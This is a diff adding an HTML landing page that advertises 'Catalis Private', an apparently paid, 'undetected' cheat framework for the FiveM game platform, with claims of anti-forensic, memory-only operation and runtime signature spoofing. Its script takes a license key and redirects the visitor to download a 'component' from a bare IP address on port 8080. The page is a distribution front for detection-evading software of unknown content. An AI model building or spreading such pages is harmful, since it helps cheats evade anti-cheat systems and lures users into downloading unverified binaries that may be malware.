@@ -1,0 +1,60 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Catalis Private — Next-Gen Undetected Solution</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #09080e; color: #e2e8f0; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        .glow { position: absolute; width: 400px; height: 400px; background: radial-gradient(circle, rgba(147, 51, 234, 0.15) 0%, rgba(9, 8, 14, 0) 70%); top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: -1; }
+        .badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 14px; background: rgba(147, 51, 234, 0.1); border: 1px solid rgba(147, 51, 234, 0.3); border-radius: 9999px; font-size: 0.85rem; color: #c084fc; margin-bottom: 24px; }
+        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 8px #22c55e; }
+        h1 { font-size: 3.5rem; font-weight: 800; letter-spacing: -0.05em; margin-bottom: 16px; background: linear-gradient(180deg, #ffffff 0%, #a855f7 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        p { max-width: 540px; color: #94a3b8; font-size: 1.1rem; line-height: 1.6; margin-bottom: 36px; }
+        .card { background: rgba(18, 16, 26, 0.7); border: 1px solid rgba(255, 255, 255, 0.08); backdrop-filter: blur(12px); border-radius: 16px; padding: 32px; max-width: 440px; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        .input-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+        input { background: #0f0d17; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 8px; padding: 14px; color: #fff; font-size: 0.95rem; text-align: center; outline: none; transition: 0.2s; }
+        input:focus { border-color: #a855f7; box-shadow: 0 0 12px rgba(168, 85, 247, 0.25); }
+        .btn { background: linear-gradient(135deg, #9333ea 0%, #6b21a8 100%); color: #fff; border: none; padding: 14px; border-radius: 8px; font-weight: 600; font-size: 1rem; cursor: pointer; transition: 0.2s; text-decoration: none; display: block; }
+        .btn:hover { opacity: 0.9; transform: translateY(-1px); box-shadow: 0 8px 20px rgba(147, 51, 234, 0.35); }
+        .features { display: flex; justify-content: center; gap: 24px; margin-top: 32px; font-size: 0.85rem; color: #64748b; }
+        .features span { display: flex; align-items: center; gap: 6px; }
+    </style>
+</head>
+<body>
+    <div class="glow"></div>
+    <div class="badge"><span class="dot"></span> FiveM Build b2699+ Compatible</div>
+    <h1>CATALIS PRIVATE</h1>
+    <p>Undetected internal framework. Ring-3 zero-trace resident mapping with runtime signature spoofing.</p>
+
+    <div class="card">
+        <div class="input-group">
+            <input type="text" id="licenseKey" placeholder="Enter License Key (CATALIS-XXXX)">
+            <button class="btn" onclick="verifyAndDownload()">Download Component</button>
+        </div>
+        <div id="statusMsg" style="font-size: 0.85rem; color: #ef4444; display: none;"></div>
+    </div>
+
+    <div class="features">
+        <span>🛡️ Anti-Forensic</span>
+        <span>⚡ Memory Only</span>
+        <span>🔒 HWID Locked</span>
+    </div>
+
+    <script>
+        function verifyAndDownload() {
+            const key = document.getElementById('licenseKey').value.trim();
+            const msg = document.getElementById('statusMsg');
+            if(!key) {
+                msg.innerText = "Please enter your license key.";
+                msg.style.display = "block";
+                return;
+            }
+            // VDS server endpointi
+            window.location.href = `http://87.76.152.82:8080/download?key=${encodeURIComponent(key)}`;
+        }
+    </script>
+</body>
+</html>
